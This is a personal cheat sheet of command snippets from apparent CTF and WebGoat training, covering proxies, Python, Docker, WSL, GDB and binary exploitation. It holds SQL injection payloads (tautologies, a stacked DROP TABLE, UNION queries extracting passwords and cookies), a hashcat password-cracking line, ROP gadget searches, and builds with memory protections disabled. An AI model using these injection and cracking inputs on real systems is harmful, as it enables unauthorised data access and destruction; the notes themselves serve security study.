## Proxy
proxychains4


```
git config --global http.proxy http://127.0.0.1:7890

git config --global --unset http.proxy


set http_proxy=http://127.0.0.1:7890
set https_proxy=http://127.0.0.1:7890
```


## Python

https://pypi.mirrors.ustc.edu.cn/simple/ 
pip install --force-reinstall 
sudo apt install --reinstall
conda create -n python35 python=3.5 
conda activate python35
python.exe -m pip install --user debugpy tornado -i https://mirrors.aliyun.com/pypi/simple

## Notes

DEP数据执行保护
x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈
![](C:\Users\Phoexina\AppData\Roaming\marktext\images\
`![](../images/2024-10-16-10-35-30-image.png)`
cd /d/Phoexina/LearningNotes

## docker

obsidian://open?vault=LearningNotes&file=images%2FPasted%20image%2020241114143351.png
```
sudo proxychains4 docker pull dockerpull.org/webgoat/assignments:findthesecret
sudo docker exec -it -u root <id> /bin/bash
sudo docker exec -it -u root bd81a8dd1ea8 /bin/bash
```


## Win


```
wsl -l --all  -v
wsl --export kali-linux d:\kali-linux.tar
wsl --import kali-linux d:\wsl\kali-linux d:\wsl\kali-linux.tar --version 2
```

在此系统上禁止运行脚本:
管理PowerShell
get-executionpolicy 查看当前执行策略
set-executionpolicy remotesigned
https://download.fastgit.org/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2_build/ghidra_11.2_PUBLIC_20240926.zip

win cmake
```shell
cd D:\Phoexina\C\asm
nasm -f win32 test.asm --prefix _ -o test.obj && cl test.obj /Fe:test.exe /link libcmt.lib legacy_stdio_definitions.lib
D:\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.41.34120\lib\x86\legacy_stdio_definitions.lib

cmake --build D:\Phoexina\C\002\cmake-build-debug-visual-studio-x86 --target 002 -j 18

cl /Od /Fe:password_verification.exe D:\Phoexina\C\000\main.cpp /link /NXCOMPAT:NO /DYNAMICBASE:NO

cl /Od /Fe:D:\Phoexina\C\001\001.exe D:\Phoexina\C\001\main.c /link /NXCOMPAT:NO /DYNAMICBASE:NO

cd ${CMAKE_SOURCE_DIR} && (nasm -f win32 test.asm --prefix _ -o test.obj && cl test.obj /Fe:test.exe /link libcmt.lib legacy_stdio_definitions.lib ) > output.log 2>&1 && type output.log
```


## Kali

/opt/baidunetdisk/baidunetdisk --no-sandbox %U
apt purge
apt autoremove
kex --sl --wtstart -s
kex --esm
nc node4.anna.nssctf.cn 28938
sudo chown -R phoexina:phoexina /tmp/.X11-unix 
wsl --export kali-linux d:\wsl\kali-linux.tar
TZ=Asia/Shanghai date
/usr/lib64/ld-linux-x86-64.so.2
/usr/lib/x86_64-linux-gnu/libc.so.6
```
echo "Oz4rPj0+LDovPiwsKDAtOw==" | base64 --decode
sh /opt/tomcat/bin/startup.sh
hashcat -m 0 -a 0 5EBE2294ECD0E0F08EAB7690D2A6EE69 /usr/share/wordlists/rockyou.txt
```


```shell
sudo wget -q -O - [https://archive.kali.org/archive-key.asc](https://archive.kali.org/archive-key.asc) | sudo apt-key add
sudo apt update

```

## Rust

./pelf /home/phoexina/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/lib/rustlib/x86_64-unknown-linux-musl/lib/libcore-1beae5247ead4ed1.rlib 1.pat
/home/phoexina/Rust/test000/target/x86_64-unknown-linux-musl/release/deps/libbase64-a25509e3b3eefb3d.rlib

## PWN

- `O_RDONLY` (值为 `0`)：只读模式。
- `O_WRONLY` (值为 `1`)：只写模式。
- `O_RDWR` (值为 `2`)：读写模式。

```
ROPgadget --binary [file] --only "pop|ret"
ROPgadget --binary ./nothing --string '/bin/sh'

elf.plt([write])
elf.symbols([vulnerable_function])

rsp 0x7ffe1e436e80 %6$p
rbp 0x7ffe1e436f80 %38$p
ret 0x7ffe1e436f88 %39$p

LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libc.so.6
 /usr/lib64/ld-linux-x86-64.so.2 ls
```


## GDB

```shell
source /home/phoexina/Templates/pwndbg/gdbinit.py
search "/bin/sh"
x/10i 0x7ff1b91a5d80 汇编
x/10x $rsp+0x10       内存
break *0x40125f
info break(简写: i b)来查看断点编号
s / si 单步进
n / ni 单步过
```


## find str

```
target:/lib/x86_64-linux-gnu/libc.so.6
vmmap
find /b 0x7fd0f2832000, 0x7fd0f2a0e000,'/','b','i','n','/','s','h',0
x/s 0x7fd0f284ffa2
0x7fd0f29cee43 /bin/sh
```


## SQL

```
UPDATE employees SET SALARY=90000 WHERE AUTH_TAN='3SL99A';
ALTER TABLE employees ADD phone varchar(20);
GRANT SELECT ON grant_rights TO unauthorized_user;

' or '1'='1

*'; drop TABLE access_log; Select * from access_log where '1'='1

SELECT * FROM user_data WHERE last_name = 'Dave' union ALL Select password from user_system_data where '1'='1

SELECT * FROM user_data WHERE last_name = 'Dave' UNION ALL  SELECT userid, NULL AS first_name, user_name as last_name,  NULL AS cc_number, password AS cc_type, cookie, NULL AS login_count FROM user_system_data where '1'='1
ZmxhZ3tiOTc2OGEzN2I0N2JlYjJkODhlMmRib2U3NmEzOWJiM30=
```


## IDE

https://download-cdn.jetbrains.com/idea/ideaIU-2024.1.7.tar.gz
https://download-cdn.jetbrains.com/idea/ideaIU-242.23726.38.tar.gz
https://download-cdn.jetbrains.com/cpp/CLion-241.8102.118.tar.gz










